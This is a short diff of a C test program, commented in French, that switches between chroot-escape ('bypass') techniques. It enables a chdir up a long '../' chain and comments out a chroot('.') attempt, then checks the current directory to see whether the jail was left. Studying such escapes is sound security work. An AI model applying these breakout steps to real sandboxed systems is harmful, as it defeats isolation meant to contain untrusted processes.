@@ -47,15 +47,15 @@ int main(void)
 		printf("trouvé /temoins\n");
 
 	// Essayer de changer de repertoire vers le racine reel.
-	//chdir("../../../../../../../../../../../../../../");
+	chdir("../../../../../../../../../../../../../../");
 
-	//getcwd(buf, 1024);
-	//printf("Repertoire current (technique de bypasse 2): %s\n", buf);
+	getcwd(buf, 1024);
+	printf("Repertoire current (technique de bypasse 2): %s\n", buf);
 
 	// Sommes nous sortie du chroot?
-	chroot(".");
-	getcwd(buf, 1024);
-	printf("Repertoire current (technique de bypasse 3): %s\n", buf);
+	//chroot(".");
+	//getcwd(buf, 1024);
+	//printf("Repertoire current (technique de bypasse 3): %s\n", buf);
 
 	// Lister les fichiers pour vérifier que nous sommes plus à l'intérieur du chroot
 	// out.
